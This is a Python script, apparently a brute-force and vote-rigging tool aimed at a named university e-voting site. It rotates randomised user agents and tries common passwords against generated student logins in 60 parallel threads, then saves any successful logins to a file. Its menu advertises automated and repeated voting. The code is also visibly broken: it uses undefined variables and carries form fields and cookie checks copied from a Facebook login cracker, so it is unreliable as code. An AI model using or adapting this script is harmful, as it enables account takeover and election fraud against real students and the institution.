
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}

###----------[ WARNA 1 ]---------- ###
P= "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P= "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
N = '\x1b[0m'	# WARNA MATI
PT = '\x1b[1;97m' # PUTIH TEBAL
MT = '\x1b[1;91m' # MERAH TEBAL
HT = '\x1b[1;92m' # HIJAU TEBAL
KT = '\x1b[1;93m' # KUNING TEBAL
BT = '\x1b[1;94m' # BIRU TEBAL
UT = '\x1b[1;95m' # UNGU TEBAL
OT = '\x1b[1;96m' # BIRU MUDA TEBAL

###----------[ WARNA 2 ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[$]" # BIRU MUDA
P2 = "[TURAG-CYBER-404]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])

rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    ugen.append(ff)
    
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='AC2001 Build/QKQ1.200412.002; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 GSA/12.23.16.23.arm64'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uakuh)
	
	a='Mozilla/5.0 (Linux; arm_64'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-A515F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaApp_Android/22.34.1 YaSearchBrowser/22.34.1 BroPP/1.0 SA/3'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uakuh)
	
for agenku in range(10000):			
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='RMX1851 Build/RKQ1.201217.002; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 GoogleApp/13.13.8.23.arm64'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(100,114)}.0.0.0 Mobile Safari/537.36'
	ugen.append(uaku2)
	ugen.append(ua_chrome)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='VOG-L29 Build/HUAWEIVOG-L29; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 GoogleApp/13.13.8.23.arm64'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
					        

###----------[ THE LOGO ]----------###	
def logo_menu():
	("""
\x1b[1;90m
██████╗ ███████╗██╗   ██╗
██╔══██╗██╔════╝██║   ██║
██████╔╝███████╗██║   ██║
██╔══██╗╚════██║██║   ██║
██║  ██║███████║╚██████╔╝
╚═╝  ╚═╝╚══════╝ ╚═════╝ 
                         

\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: CYBER DEMON 404
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mCYBERDEMON-404
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM-VOTING / \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VERSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
###----------[ MENU LOGIN ]----------###	
def menu():   
    os.system('clear')
    logo_menu()
    print(f'[1] AUTO RANDOM VOTING')
    print(f'[2] VOTE MULTIPLE TIMES WITH SINGLE PIN')
    print(f'[3] DIRECT VOTING ')
   #print(f'[4] Create File')
  #print(f'[5] Login Tool')
  #print(f'[6] Logout Cookie')
  #print(f'[7] Remove Trash Files ')
  #print(f'[8] Separate Ids')
  #print(f'[9] Remove Duplicate IDs')
    print(f'[W] Chat me on WhatsApp ')
    print(f'[F] Join me on Facebook ')
    print('')
    select = input('Select Menu >: ')
    if select =='1':
        rando()
    elif select =='2':
        vot()
    elif select =='W':
        os.system('xdg-open https://wa.me/2348178406817')
        pass
    elif select =='F':
        print("Fuck You")
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        menu()
        
def rando():
	user=[]
	os.system('clear')
	print(logo)
	url = "https://evoting.rsu.edu.ng"
	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input(' ┗━[+] LIMIT : '))
	letters = string.ascii_lowercase
	for nmbr in range(limit):
		first = ''.join(random.choice(letters) for _ in range(5))
		last = ''.join(random.choice(letters) for _ in range(6))
		middle = ''.join(random.choice(letters) for _ in range(7))
		user.append(middle)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('┏━[•] VOTING STARTED')
		print('┗━[•] GETTING STUDENT ID AND PASSWORD... ')
		print(50*'━')
		for guru in user:
			uid = first+'.'+last
			pwx = [first+last+guru,"rsu2020",first+last,first+'123',first+'1234','123456789','123456','12345678',first+' '+last,"rsu2021","rsu2022","rsu2023"]
			mo = "er"
			mi = "et"
			yaari.submit(crkk,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] logins saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
        

def crkk(uid,pwx,tl):
    global loop
    global cps    
    global oks
    try:
        for mo in mi:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mVOTING😂\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mSUCCESSFUL:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            url = "https://evoting.rsu.edu.ng"
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            votee = session.get(url).text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(votee)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(votee)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(votee)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(votee)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":pwx,
            "login":"Log In"}
            data = {
            'user': uid,
            'passwd1': pwx,
            }
            headers = {
            'Host': 'evoting.rsu.edu.ng',
            # 'content-length': '35',
            'sec-ch-ua': 'Not.A/Brand;v=8, Chromium;v=114, Google',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua-platform': 'Android',
            'origin': 'https://evoting.rsu.edu.ng',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://evoting.rsu.edu.ng/?fbclid=IwAR0iWCifQamuF1lwvGE3uWY8RBwzs2OZV2YboHpdqXyAP2cx3KQInarOe4M',
            # 'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'twk_uuid_60859d8f5eb20e09cf366f00=%7B%22uuid%22%3A%221.1hH7eaTLzdktLGdiTw2n25nUY06ph1JzfQCjM5RT0N1Rgxew66S9QcXNWRlEGCFd83sCqPI6ff64qMbYfzZD9TZX7uu9AaXxTLyErsGjiHz8ATBJnkf%22%2C%22version%22%3A3%2C%22domain%22%3A%22rsu.edu.ng%22%2C%22ts%22%3A1695971844034%7D; TawkConnectionTime=0; PHPSESSID=cods0tt3bmi691173q4bdvjl8u; twk_idm_key=65aAXdZp0UfJy1XmmP2eY; twk_uuid_5e3838e0298c395d1ce5f5a1=%7B%22uuid%22%3A%221.1hH2UJrcDkGbFrQyFzujoGZxawEQAEMUh45Bd4xSgZUienTxZzdlZ3HGJoY5RAnVFy1hamHwJ9kDsykIoLGH21MWVmYRzO4tO2LBXMntT6lCWOHKMXJ%22%2C%22version%22%3A3%2C%22domain%22%3A%22rsu.edu.ng%22%2C%22ts%22%3A1693417170870%7D',
            }
            lo = session.post(url,data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                print(f'\r\33[1;92m [RSU-💚] '+uid+' | '+pwx+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/jahidok.txt', 'a').write(uid+' | '+pwx+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:

        pass
menu()